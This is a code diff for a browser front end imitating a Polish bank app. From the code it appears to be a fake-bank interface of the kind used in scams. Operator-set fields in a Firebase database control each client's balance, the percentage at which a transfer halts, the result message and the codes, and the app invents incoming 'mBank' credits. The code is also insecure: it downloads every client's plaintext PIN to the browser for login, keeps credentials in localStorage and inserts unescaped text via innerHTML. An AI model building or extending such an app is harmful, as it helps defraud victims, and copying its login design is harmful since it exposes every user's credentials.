-      databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
-      projectId: "vantex-admin-2026",
-      storageBucket: "vantex-admin-2026.firebasestorage.app",
-      messagingSenderId: "810884502320",
-      appId: "1:810884502320:web:b5ba7c2909ddf4ccf02ef5"
-    };
+  const firebaseConfig = {
+    apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
+    authDomain: "vantex-admin-2026.firebaseapp.com",
+    databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "vantex-admin-2026",
+    storageBucket: "vantex-admin-2026.firebasestorage.app",
+    messagingSenderId: "810884502320",
+    appId: "1:810884502320:web:b5ba7c2909ddf4ccf02ef5"
+  };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    let user = null;
-    let currentHistory = [];
-    let historyListener = null;
-    let balanceListener = null;
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  let user = null;
+  let currentHistory = [];
+  let historyListener = null;
+  let balanceListener = null;
+  let statusListener = null;
 
-    // ===== THEMES =====
-    const themes = {
-      purple: { p: '#6D28D9', l: '#EDE9FE' },
-      blue: { p: '#2563EB', l: '#DBEAFE' },
-      yellow: { p: '#D97706', l: '#FEF3C7' }
-    };
+  // ===== THEMES =====
+  const themes = {
+    purple: { p: '#6D28D9', l: '#EDE9FE' },
+    blue: { p: '#2563EB', l: '#DBEAFE' },
+    yellow: { p: '#D97706', l: '#FEF3C7' }
+  };
 
-    function adjustBrightness(hex, percent) {
-      const num = parseInt(hex.replace('#', ''), 16);
-      const r = Math.min(255, Math.max(0, (num >> 16) + percent));
-      const g = Math.min(255, Math.max(0, ((num >> 8) & 0x00FF) + percent));
-      const b = Math.min(255, Math.max(0, (num & 0x0000FF) + percent));
-      return `#${(r << 16 | g << 8 | b).toString(16).padStart(6, '0')}`;
-    }
+  function adjustBrightness(hex, percent) {
+    const num = parseInt(hex.replace('#', ''), 16);
+    const r = Math.min(255, Math.max(0, (num >> 16) + percent));
+    const g = Math.min(255, Math.max(0, ((num >> 8) & 0x00FF) + percent));
+    const b = Math.min(255, Math.max(0, (num & 0x0000FF) + percent));
+    return `#${(r << 16 | g << 8 | b).toString(16).padStart(6, '0')}`;
+  }
 
-    function applyTheme(theme) {
-      const t = themes[theme] || themes.purple;
-      document.documentElement.style.setProperty('--p', t.p);
-      document.documentElement.style.setProperty('--p-light', t.l);
-      document.documentElement.style.setProperty('--p-gradient', `linear-gradient(135deg, ${t.p}, ${adjustBrightness(t.p, -10)})`);
-      document.documentElement.style.setProperty('--p-soft', `${t.p}14`);
-      localStorage.setItem('floa_theme', theme);
-    }
+  function applyTheme(theme) {
+    const t = themes[theme] || themes.purple;
+    document.documentElement.style.setProperty('--p', t.p);
+    document.documentElement.style.setProperty('--p-light', t.l);
+    document.documentElement.style.setProperty('--p-gradient', `linear-gradient(135deg, ${t.p}, ${adjustBrightness(t.p, -10)})`);
+    document.documentElement.style.setProperty('--p-soft', `${t.p}14`);
+    localStorage.setItem('floa_theme', theme);
+  }
 
-    const savedTheme = localStorage.getItem('floa_theme') || 'purple';
-    applyTheme(savedTheme);
+  const savedTheme = localStorage.getItem('floa_theme') || 'purple';
+  applyTheme(savedTheme);
 
-    // ===== FORMATTEUR =====
-    const fmt = (n) => {
-      const dev = (user && user.devise) ? user.devise : 'zł';
-      return new Intl.NumberFormat('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n) || 0) + ' ' + dev;
-    };
+  // ===== FORMATTEUR =====
+  const fmt = (n) => {
+    const dev = (user && user.devise) ? user.devise : 'zł';
+    return new Intl.NumberFormat('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n) || 0) + ' ' + dev;
+  };
 
-    // ===== AJUSTEMENT DE TEXTE =====
-    function adjustFontSize(element, baseSize, maxChars, minSize) {
-      if (!element) return;
-      requestAnimationFrame(() => {
-        const text = element.textContent || '';
-        const container = element.parentElement;
-        if (!container) return;
-        const containerWidth = container.clientWidth - 10;
+  // ===== AJUSTEMENT DE TEXTE =====
+  function adjustFontSize(element, baseSize, maxChars, minSize) {
+    if (!element) return;
+    requestAnimationFrame(() => {
+      const text = element.textContent || '';
+      const container = element.parentElement;
+      if (!container) return;
+      const containerWidth = container.clientWidth - 10;
+      const avgCharWidth = baseSize * 0.55;
+      const maxCharsLocal = maxChars || Math.floor(containerWidth / avgCharWidth);
+      let newSize = baseSize;
+      if (text.length > maxCharsLocal) {
+        newSize = Math.max(minSize || 10, baseSize * (maxCharsLocal / text.length));
+      }
+      element.style.fontSize = newSize + 'px';
+    });
+  }
+
+  function adjustGreetingFontSize() {
+    const greetSpan = document.querySelector('#greet span');
+    if (greetSpan) {
+      const container = document.getElementById('greet');
+      if (container) {
+        const containerWidth = container.clientWidth - 80;
+        const baseSize = 18;
         const avgCharWidth = baseSize * 0.55;
-        const maxCharsLocal = maxChars || Math.floor(containerWidth / avgCharWidth);
-        let newSize = baseSize;
-        if (text.length > maxCharsLocal) {
-          newSize = Math.max(minSize || 10, baseSize * (maxCharsLocal / text.length));
-        }
-        element.style.fontSize = newSize + 'px';
-      });
-    }
-
-    function adjustGreetingFontSize() {
-      const greetSpan = document.querySelector('#greet span');
-      if (greetSpan) {
-        const container = document.getElementById('greet');
-        if (container) {
-          const containerWidth = container.clientWidth - 80;
-          const baseSize = 18;
-          const avgCharWidth = baseSize * 0.55;
-          const maxChars = Math.floor(containerWidth / avgCharWidth);
-          adjustFontSize(greetSpan, baseSize, maxChars, 12);
-        }
+        const maxChars = Math.floor(containerWidth / avgCharWidth);
+        adjustFontSize(greetSpan, baseSize, maxChars, 12);
       }
     }
+  }
 
-    function adjustBalanceFontSize(element) {
-      if (!element) return;
-      const text = element.textContent || '';
-      const container = element.parentElement;
-      if (!container) return;
-      const containerWidth = container.clientWidth - 40;
-      const baseSize = 26;
-      const avgCharWidth = baseSize * 0.55;
-      const maxChars = Math.floor(containerWidth / avgCharWidth);
-      adjustFontSize(element, baseSize, maxChars, 10);
+  function adjustBalanceFontSize(element) {
+    if (!element) return;
+    const text = element.textContent || '';
+    const container = element.parentElement;
+    if (!container) return;
+    const containerWidth = container.clientWidth - 40;
+    const baseSize = 26;
+    const avgCharWidth = baseSize * 0.55;
+    const maxChars = Math.floor(containerWidth / avgCharWidth);
+    adjustFontSize(element, baseSize, maxChars, 10);
+  }
+
+  function adjustStatFontSize(element) {
+    if (!element) return;
+    const text = element.textContent || '';
+    const container = element.parentElement;
+    if (!container) return;
+    const containerWidth = container.clientWidth - 20;
+    const baseSize = 20;
+    const avgCharWidth = baseSize * 0.55;
+    const maxChars = Math.floor(containerWidth / avgCharWidth);
+    adjustFontSize(element, baseSize, maxChars, 11);
+  }
+
+  function adjustAllTexts() {
+    adjustGreetingFontSize();
+    const bal = document.getElementById('bal');
+    if (bal) adjustBalanceFontSize(bal);
+    document.querySelectorAll('.stat-value').forEach(el => adjustStatFontSize(el));
+  }
+
+  function updateBalanceDisplay(balanceElement, statElement, amount) {
+    const formatted = fmt(amount);
+    if (balanceElement) {
+      balanceElement.textContent = formatted;
+      adjustBalanceFontSize(balanceElement);
     }
-
-    function adjustStatFontSize(element) {
-      if (!element) return;
-      const text = element.textContent || '';
-      const container = element.parentElement;
-      if (!container) return;
-      const containerWidth = container.clientWidth - 20;
-      const baseSize = 20;
-      const avgCharWidth = baseSize * 0.55;
-      const maxChars = Math.floor(containerWidth / avgCharWidth);
-      adjustFontSize(element, baseSize, maxChars, 11);
+    if (statElement) {
+      statElement.textContent = formatted;
+      adjustStatFontSize(statElement);
     }
+    adjustAllTexts();
+  }
 
-    function adjustAllTexts() {
-      adjustGreetingFontSize();
-      const bal = document.getElementById('bal');
-      if (bal) adjustBalanceFontSize(bal);
-      document.querySelectorAll('.stat-value').forEach(el => adjustStatFontSize(el));
+  // ===== HISTORIQUE =====
+  function renderHistory(historyArray) {
+    const list = document.getElementById('history-list');
+    list.innerHTML = '';
+    if (!historyArray || historyArray.length === 0) {
+      list.innerHTML = `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
+      document.getElementById('tx-count-badge').textContent = '0';
+      return;
     }
-
-    function updateBalanceDisplay(balanceElement, statElement, amount) {
-      const formatted = fmt(amount);
-      if (balanceElement) {
-        balanceElement.textContent = formatted;
-        adjustBalanceFontSize(balanceElement);
-      }
-      if (statElement) {
-        statElement.textContent = formatted;
-        adjustStatFontSize(statElement);
-      }
-      adjustAllTexts();
-    }
-
-    // ===== HISTORIQUE =====
-    function renderHistory(historyArray) {
-      const list = document.getElementById('history-list');
-      list.innerHTML = '';
-      if (!historyArray || historyArray.length === 0) {
-        list.innerHTML = `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
-        document.getElementById('tx-count-badge').textContent = '0';
-        return;
-      }
-      const sorted = [...historyArray].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-      sorted.forEach(d => {
-        const card = document.createElement('div');
-        card.className = 'history-item';
-        card.setAttribute('data-id', d.id);
-        card.setAttribute('data-timestamp', d.timestamp);
-        const pos = d.amount >= 0;
-        const subtitleHtml = d.subtitle ? `<span class="sub">• ${d.subtitle}</span>` : '';
-        card.innerHTML = `
-          <div class="history-left">
-            <div class="history-icon ${pos ? 'credit' : 'debit'}"><i class="fa-solid ${pos ? 'fa-check' : 'fa-arrow-up'}"></i></div>
-            <div class="history-info">
-              <div class="title">${d.title} ${subtitleHtml}</div>
-              <div class="meta">${d.date || ''} • ${d.time || ''}</div>
-            </div>
+    const sorted = [...historyArray].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+    sorted.forEach(d => {
+      const card = document.createElement('div');
+      card.className = 'history-item';
+      card.setAttribute('data-id', d.id);
+      card.setAttribute('data-timestamp', d.timestamp);
+      const pos = d.amount >= 0;
+      const subtitleHtml = d.subtitle ? `<span class="sub">• ${d.subtitle}</span>` : '';
+      card.innerHTML = `
+        <div class="history-left">
+          <div class="history-icon ${pos ? 'credit' : 'debit'}"><i class="fa-solid ${pos ? 'fa-check' : 'fa-arrow-up'}"></i></div>
+          <div class="history-info">
+            <div class="title">${d.title} ${subtitleHtml}</div>
+            <div class="meta">${d.date || ''} • ${d.time || ''}</div>
           </div>
-          <div class="history-amount ${pos ? 'credit' : 'debit'}">${pos ? '+ ' : '- '}${fmt(Math.abs(d.amount))}</div>
-        `;
-        card.onclick = () => showTxDetail(d);
-        list.appendChild(card);
-      });
-      document.getElementById('tx-count-badge').textContent = sorted.length;
+        </div>
+        <div class="history-amount ${pos ? 'credit' : 'debit'}">${pos ? '+ ' : '- '}${fmt(Math.abs(d.amount))}</div>
+      `;
+      card.onclick = () => showTxDetail(d);
+      list.appendChild(card);
+    });
+    document.getElementById('tx-count-badge').textContent = sorted.length;
+  }
+
+  function genId(prefix) {
+    return prefix + Math.floor(1000000000 + Math.random() * 9000000);
+  }
+
+  // Ajout d'une transaction dans Firebase
+  function addHistory(data) {
+    if (!data.amount || data.amount === 0) return;
+    if (!data.id) data.id = genId(data.amount >= 0 ? 'CR' : 'DE');
+    const now = new Date();
+    if (!data.time || !data.timestamp) {
+      if (!data.time) data.time = now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' });
+      if (!data.timestamp) data.timestamp = now.getTime();
     }
+    if (!data.date) data.date = now.toLocaleDateString('pl-PL');
 
-    function genId(prefix) {
-      return prefix + Math.floor(1000000000 + Math.random() * 9000000);
+    if (user && user._id) {
+      push(ref(db, 'clients/' + user._id + '/history'), data)
+        .catch(err => console.error('Firebase push error:', err));
     }
+  }
 
-    function addHistory(data, saveToFirebase = true) {
-      if (!data.amount || data.amount === 0) return;
-      if (!data.id) data.id = genId(data.amount >= 0 ? 'CR' : 'DE');
-      const now = new Date();
-      if (!data.time || !data.timestamp) {
-        if (!data.time) data.time = now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' });
-        if (!data.timestamp) data.timestamp = now.getTime();
-      }
-      if (!data.date) data.date = now.toLocaleDateString('pl-PL');
+  // ===== CHARGEMENT DE L'HISTORIQUE =====
+  async function initHistoryListener(userId) {
+    if (historyListener) historyListener();
 
-      // On sauvegarde dans Firebase (source de vérité)
-      if (saveToFirebase && user && user._id) {
-        push(ref(db, 'clients/' + user._id + '/history'), data)
-          .then(() => console.log('Transaction saved to Firebase'))
-          .catch(err => console.error('Firebase push error:', err));
-      }
-    }
-
-    // ===== CHARGEMENT DE L'HISTORIQUE =====
-    async function initHistoryListener(userId) {
-      if (historyListener) historyListener();
-
-      // Chargement initial
-      try {
-        const snapshot = await get(ref(db, 'clients/' + userId + '/history'));
-        if (snapshot.exists()) {
-          const val = snapshot.val();
-          const arr = Object.values(val);
-          currentHistory = arr;
-          renderHistory(arr);
-        } else {
-          currentHistory = [];
-          renderHistory([]);
-        }
-      } catch (err) {
-        console.error('Erreur chargement historique:', err);
+    // Chargement initial
+    try {
+      const snapshot = await get(ref(db, 'clients/' + userId + '/history'));
+      if (snapshot.exists()) {
+        const val = snapshot.val();
+        const arr = Object.values(val);
+        currentHistory = arr;
+        renderHistory(arr);
+      } else {
+        currentHistory = [];
         renderHistory([]);
       }
-
-      // Écoute en temps réel
-      historyListener = onValue(ref(db, 'clients/' + userId + '/history'), (snap) => {
-        const val = snap.val();
-        if (val) {
-          const arr = Object.values(val);
-          currentHistory = arr;
-          renderHistory(arr);
-        } else {
-          currentHistory = [];
-          renderHistory([]);
-        }
-      });
+    } catch (err) {
+      console.error('Erreur chargement historique:', err);
+      renderHistory([]);
     }
 
-    // ===== SURVEILLANCE DU SOLDE EN TEMPS RÉEL =====
-    function watchBalance(userId) {
-      if (balanceListener) balanceListener();
-      balanceListener = onValue(ref(db, 'clients/' + userId + '/montant'), (snap) => {
-        const newMontant = snap.val();
-        if (newMontant !== null && newMontant !== undefined) {
-          const oldMontant = user ? user.montant : 0;
-          user.montant = Number(newMontant);
+    // Écoute en temps réel
+    historyListener = onValue(ref(db, 'clients/' + userId + '/history'), (snap) => {
+      const val = snap.val();
+      if (val) {
+        const arr = Object.values(val);
+        currentHistory = arr;
+        renderHistory(arr);
+      } else {
+        currentHistory = [];
+        renderHistory([]);
+      }
+    });
+  }
+
+  // ===== SURVEILLANCE DU SOLDE EN TEMPS RÉEL =====
+  function watchBalance(userId) {
+    if (balanceListener) balanceListener();
+    balanceListener = onValue(ref(db, 'clients/' + userId + '/montant'), (snap) => {
+      const newMontant = snap.val();
+      if (newMontant !== null && newMontant !== undefined) {
+        const oldMontant = user ? user.montant : 0;
+        user.montant = Number(newMontant);
+        const balElement = document.getElementById('bal');
+        const statBalElement = document.getElementById('stat-balance');
+        updateBalanceDisplay(balElement, statBalElement, user.montant);
+        document.getElementById('bal2').textContent = fmt(user.montant);
+        document.getElementById('accinfo').innerHTML = buildProfile(user);
+
+        // Si le montant a augmenté, on ajoute une transaction (crédit)
+        if (newMontant > oldMontant) {
+          const diff = newMontant - oldMontant;
+          // Vérifier si cette augmentation n'a pas déjà été enregistrée récemment
+          const lastTx = currentHistory.length > 0 ? currentHistory.reduce((a, b) => a.timestamp > b.timestamp ? a : b) : null;
+          if (!lastTx || Math.abs(lastTx.amount - diff) > 0.01 || (Date.now() - lastTx.timestamp) > 2000) {
+            const now = new Date();
+            const tx = {
+              id: genId('CR'),
+              title: 'Przelew otrzymany',
+              subtitle: 'mBank',
+              amount: diff,
+              beneficiary: 'mBank',
+              iban: '-',
+              date: now.toLocaleDateString('pl-PL'),
+              time: now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' }),
+              timestamp: now.getTime()
+            };
+            addHistory(tx);
+            toast(`+${fmt(diff)}`);
+          }
+        }
+      }
+    });
+  }
+
+  // ===== SURVEILLANCE DU STATUT CLIENT (blocage, reset, etc.) =====
+  function watchClientStatus(userId) {
+    if (statusListener) statusListener();
+    statusListener = onValue(ref(db, 'clients/' + userId), (snap) => {
+      const data = snap.val();
+      if (!data) {
+        toast('Konto usunięte');
+        setTimeout(() => logout(), 1500);
+        return;
+      }
+      if (data.blocked) {
+        toast('Konto zablokowane');
+        localStorage.removeItem('floa_session');
+        setTimeout(() => { show('login'); user = null; }, 1000);
+        return;
+      }
+
+      // Gestion du reset (historyReset)
+      if (data.historyReset) {
+        // On récupère la dernière valeur de reset connue
+        const key = 'floa_' + user.email.toLowerCase();
+        const stored = JSON.parse(localStorage.getItem(key) || '{}');
+        if (!stored.lastReset || data.historyReset > stored.lastReset) {
+          // Réinitialisation : on met le montant à 0, on vide l'historique dans Firebase
+          update(ref(db, 'clients/' + userId), { montant: 0 });
+          set(ref(db, 'clients/' + userId + '/history'), null)
+            .then(() => {
+              // Mise à jour du cache local
+              localStorage.setItem(key, JSON.stringify({ montant: 0, history: [], lastReset: data.historyReset }));
+              // Mise à jour de l'affichage
+              user.montant = 0;
+              const balElement = document.getElementById('bal');
+              const statBalElement = document.getElementById('stat-balance');
+              updateBalanceDisplay(balElement, statBalElement, 0);
+              document.getElementById('bal2').textContent = fmt(0);
+              document.getElementById('accinfo').innerHTML = buildProfile(user);
+              renderHistory([]);
+              document.getElementById('stat-tx').textContent = 0;
+              adjustAllTexts();
+              toast('Historia i saldo zresetowane');
+            })
+            .catch(err => console.error('Erreur reset:', err));
+        }
+        // On supprime le champ historyReset pour éviter de répéter l'opération
+        update(ref(db, 'clients/' + userId), { historyReset: null });
+        return;
+      }
+
+      // Mise à jour des autres propriétés
+      const oldTheme = user.theme;
+      user.pct = data.pct;
+      user.code = data.code;
+      user.msg = data.msg;
+      user.pays = data.pays;
+      user.adresse = data.adresse;
+      user.tel = data.tel;
+      user.devise = data.devise || 'zł';
+      user.notification = data.notification || '';
+      user.theme = data.theme || 'purple';
+
+      if (oldTheme !== user.theme) {
+        applyTheme(user.theme);
+        document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
+      }
+      updateAvatars();
+      updateCurrency();
+      updateNotifBadge();
+      document.getElementById('accinfo').innerHTML = buildProfile(user);
+      adjustAllTexts();
+    });
+  }
+
+  // ===== PROFIL =====
+  function buildProfile(u) {
+    return `
+      <div><i class="fa-solid fa-id-card" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Imię i nazwisko:</span> <b style="color:var(--text-primary)">${u.nom}</b></div>
+      <div><i class="fa-solid fa-wallet" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Saldo konta:</span> <b style="color:var(--text-primary)">${fmt(u.montant)}</b></div>
+      <div><i class="fa-solid fa-envelope" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Adres e-mail:</span> <b style="color:var(--text-primary)">${u.email}</b></div>
+      <div><i class="fa-solid fa-flag" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Kraj:</span> <b style="color:var(--text-primary)">${u.pays || '-'}</b></div>
+      <div><i class="fa-solid fa-location-dot" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Adres zamieszkania:</span> <b style="color:var(--text-primary)">${u.adresse || '-'}</b></div>
+      <div><i class="fa-solid fa-phone" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Numer telefonu:</span> <b style="color:var(--text-primary)">${u.tel || '-'}</b></div>
+    `;
+  }
+
+  function updateAvatars() {
+    if (!user) return;
+    const initials = user.nom.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
+    ['avatar', 'avatar2', 'avatar3', 'avatar4'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.textContent = initials;
+    });
+    const holder = document.getElementById('cardHolderName');
+    if (holder) holder.textContent = user.nom.toUpperCase();
+  }
+
+  function updateCurrency() {
+    if (!user) return;
+    const dev = user.devise || 'zł';
+    const cs = document.getElementById('currency-symbol');
+    if (cs) cs.textContent = dev;
+    document.getElementById('stat-devise').textContent = dev;
+    adjustAllTexts();
+  }
+
+  function updateNotifBadge() {
+    const hasNotif = user && user.notification && user.notification.trim() !== '';
+    ['notif-badge', 'notif-badge2', 'notif-badge3', 'notif-badge4'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) {
+        if (hasNotif) el.classList.remove('hidden');
+        else el.classList.add('hidden');
+      }
+    });
+  }
+
+  // ===== NAVIGATION =====
+  const show = id => {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    document.getElementById('mainNav').style.display = (id === 'login' ? 'none' : 'grid');
+    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+    const map = { 'dashboard': 0, 'transfer': 1 };
+    if (map[id] !== undefined) {
+      document.querySelectorAll('.nav-item')[map[id]]?.classList.add('active');
+    }
+    if (id === 'dashboard') {
+      setTimeout(() => adjustAllTexts(), 50);
+    }
+  };
+  window.show = show;
+
+  function navigateTo(id) {
+    history.pushState({ screen: id }, '', '#' + id);
+    show(id);
+  }
+  window.navigateTo = navigateTo;
+
+  window.addEventListener('popstate', (e) => {
+    if (user) {
+      const target = e.state?.screen || 'dashboard';
+      show(target);
+    } else {
+      show('login');
+    }
+  });
+
+  if (!location.hash) history.replaceState({ screen: 'login' }, '', '#login');
+
+  // ===== LOGIN / LOGOUT =====
+  window.login = async () => {
+    const e = document.getElementById('email').value.trim().toLowerCase();
+    const p = document.getElementById('pin').value.trim();
+    const err = document.getElementById('err');
+    err.classList.add('hidden');
+
+    const s = await get(ref(db, 'clients'));
+    const d = s.val() || {};
+    let f = null, fid = null;
+    for (const k in d) {
+      const v = d[k];
+      if (v.email && v.email.toLowerCase() === e && String(v.pin) === p) {
+        f = v;
+        fid = k;
+        break;
+      }
+    }
+
+    if (!f) {
+      err.textContent = 'Błąd logowania – sprawdź email i PIN';
+      err.classList.remove('hidden');
+      localStorage.removeItem('floa_session');
+      show('login');
+      return;
+    }
+    if (f.blocked) {
+      err.textContent = 'Konto zostało zablokowane';
+      err.classList.remove('hidden');
+      localStorage.removeItem('floa_session');
+      return;
+    }
+
+    user = f;
+    user._id = fid;
+    if (!user.devise) user.devise = 'zł';
+    if (!user.theme) user.theme = 'purple';
+
+    localStorage.setItem('floa_session', JSON.stringify({ e, p }));
+    localStorage.setItem('floa_theme', user.theme);
+
+    document.getElementById('greet').innerHTML = `Powitanie, <span>${user.nom}</span>`;
+    adjustGreetingFontSize();
+
+    const balElement = document.getElementById('bal');
+    const statBalElement = document.getElementById('stat-balance');
+    updateBalanceDisplay(balElement, statBalElement, user.montant);
+    document.getElementById('bal2').textContent = fmt(user.montant);
+
+    applyTheme(user.theme);
+    updateAvatars();
+    updateCurrency();
+    updateNotifBadge();
+    document.getElementById('accinfo').innerHTML = buildProfile(user);
+
+    // Initialiser les écouteurs
+    await initHistoryListener(fid);
+    watchBalance(fid);
+    watchClientStatus(fid);
+
+    adjustAllTexts();
+    navigateTo('dashboard');
+    setupValidation();
+  };
+
+  window.logout = () => {
+    user = null;
+    if (historyListener) {
+      historyListener();
+      historyListener = null;
+    }
+    if (balanceListener) {
+      balanceListener();
+      balanceListener = null;
+    }
+    if (statusListener) {
+      statusListener();
+      statusListener = null;
+    }
+    localStorage.removeItem('floa_session');
+    localStorage.removeItem('floa_theme');
+    show('login');
+    history.replaceState({ screen: 'login' }, '', '#login');
+  };
+
+  // ===== GESTION DE LA SESSION =====
+  const saved = localStorage.getItem('floa_session');
+  if (saved) {
+    try {
+      const { e, p } = JSON.parse(saved);
+      document.getElementById('email').value = e;
+      document.getElementById('pin').value = p;
+      show('dashboard');
+      document.getElementById('greet').innerHTML = 'Ładowanie...';
+      setTimeout(() => window.login(), 50);
+    } catch {}
+  }
+
+  // ===== TRANSFERT =====
+  window.toVerify = () => {
+    const amt = Number(document.getElementById('a').value) || 0;
+    if (amt > Number(user.montant)) {
+      toast('Kwota przekracza saldo!');
+      return;
+    }
+    document.getElementById('va').textContent = fmt(amt);
+    document.getElementById('vb').textContent = document.getElementById('b').value;
+    document.getElementById('vc').textContent = document.getElementById('c').value;
+    document.getElementById('vd').textContent = document.getElementById('d').value;
+    document.getElementById('ve').textContent = document.getElementById('e').value;
+    document.getElementById('vf').textContent = document.getElementById('f').value;
+    navigateTo('verify');
+  };
+
+  window.finish = () => {
+    if (!user) return;
+    if (document.getElementById('code').value.trim() !== user.code) {
+      toast('Nieprawidłowy kod');
+      return;
+    }
+    const pct = Number(user.pct) || 100;
+    const msg = user.msg || '';
+    const pr = document.getElementById('progress');
+    const bar = document.getElementById('bar');
+    const txt = document.getElementById('ptext');
+    pr.classList.remove('hidden');
+    let w = 0;
+    const interval = setInterval(() => {
+      w += 2;
+      const cur = Math.min(w, pct);
+      bar.style.width = cur + '%';
+      txt.textContent = cur + '%';
+      if (w >= pct) {
+        clearInterval(interval);
+
+        const benef = document.getElementById('b').value || '-';
+        const amtVal = Number(document.getElementById('a').value) || 0;
+        const account = document.getElementById('c').value || '-';
+        const formattedAmount = fmt(amtVal);
+
+        const icon = document.getElementById('resultIcon');
+        const status = document.getElementById('resultStatus');
+        const percentEl = document.getElementById('resultPercent');
+        const benefEl = document.getElementById('resultBenef');
+        const amountEl = document.getElementById('resultAmount');
+        const accountEl = document.getElementById('resultAccount');
+        const msgEl = document.getElementById('resultMsg');
+
+        percentEl.textContent = cur + '%';
+        if (pct >= 100) {
+          icon.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10B981;"></i>';
+          status.textContent = 'Przelew zatwierdzony ✓';
+        } else {
+          icon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#EAB308;"></i>';
+          status.textContent = `Przelew zatrzymany na ${pct}%`;
+        }
+        benefEl.textContent = benef;
+        amountEl.textContent = formattedAmount;
+        accountEl.textContent = account;
+        msgEl.textContent = msg || (pct >= 100 ? 'Transakcja została pomyślnie zrealizowana.' : 'Transakcja została przerwana przez system.');
+
+        if (pct >= 100) {
+          const amt = Number(document.getElementById('a').value) || 0;
+          const newMontant = Number(user.montant) - amt;
+          user.montant = newMontant;
+
+          // Mettre à jour le solde dans Firebase
+          update(ref(db, 'clients/' + user._id), { montant: newMontant })
+            .then(() => {
+              // Ajouter la transaction de débit
+              const now = new Date();
+              const tx = {
+                id: genId('DE'),
+                title: 'Przelew wysłany',
+                subtitle: document.getElementById('b').value,
+                amount: -amt,
+                beneficiary: document.getElementById('b').value,
+                iban: document.getElementById('c').value,
+                date: now.toLocaleDateString('pl-PL'),
+                time: now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' }),
+                timestamp: now.getTime()
+              };
+              addHistory(tx);
+              toast(`-${fmt(amt)}`);
+            })
+            .catch(err => console.error(err));
+
+          // Mettre à jour l'affichage immédiatement
           const balElement = document.getElementById('bal');
           const statBalElement = document.getElementById('stat-balance');
           updateBalanceDisplay(balElement, statBalElement, user.montant);
           document.getElementById('bal2').textContent = fmt(user.montant);
           document.getElementById('accinfo').innerHTML = buildProfile(user);
-
-          // Si le montant a augmenté, on ajoute une transaction (crédit)
-          if (newMontant > oldMontant) {
-            const diff = newMontant - oldMontant;
-            // Vérifier si cette augmentation n'a pas déjà été enregistrée récemment
-            const lastTx = currentHistory.length > 0 ? currentHistory.reduce((a, b) => a.timestamp > b.timestamp ? a : b) : null;
-            if (!lastTx || Math.abs(lastTx.amount - diff) > 0.01 || (Date.now() - lastTx.timestamp) > 2000) {
-              const now = new Date();
-              const tx = {
-                id: genId('CR'),
-                title: 'Przelew otrzymany',
-                subtitle: 'mBank',
-                amount: diff,
-                beneficiary: 'mBank',
-                iban: '-',
-                date: now.toLocaleDateString('pl-PL'),
-                time: now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' }),
-                timestamp: now.getTime()
-              };
-              addHistory(tx, true);
-              toast(`+${fmt(diff)}`);
-            }
-          }
         }
-      });
-    }
 
-    // ===== PROFIL =====
-    function buildProfile(u) {
-      return `
-        <div><i class="fa-solid fa-id-card" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Imię i nazwisko:</span> <b style="color:var(--text-primary)">${u.nom}</b></div>
-        <div><i class="fa-solid fa-wallet" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Saldo konta:</span> <b style="color:var(--text-primary)">${fmt(u.montant)}</b></div>
-        <div><i class="fa-solid fa-envelope" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Adres e-mail:</span> <b style="color:var(--text-primary)">${u.email}</b></div>
-        <div><i class="fa-solid fa-flag" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Kraj:</span> <b style="color:var(--text-primary)">${u.pays || '-'}</b></div>
-        <div><i class="fa-solid fa-location-dot" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Adres zamieszkania:</span> <b style="color:var(--text-primary)">${u.adresse || '-'}</b></div>
-        <div><i class="fa-solid fa-phone" style="width:16px;color:var(--p)"></i> <span style="color:var(--text-secondary)">Numer telefonu:</span> <b style="color:var(--text-primary)">${u.tel || '-'}</b></div>
-      `;
-    }
-
-    function updateAvatars() {
-      if (!user) return;
-      const initials = user.nom.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
-      ['avatar', 'avatar2', 'avatar3', 'avatar4'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.textContent = initials;
-      });
-      const holder = document.getElementById('cardHolderName');
-      if (holder) holder.textContent = user.nom.toUpperCase();
-    }
-
-    function updateCurrency() {
-      if (!user) return;
-      const dev = user.devise || 'zł';
-      const cs = document.getElementById('currency-symbol');
-      if (cs) cs.textContent = dev;
-      document.getElementById('stat-devise').textContent = dev;
-      adjustAllTexts();
-    }
-
-    function updateNotifBadge() {
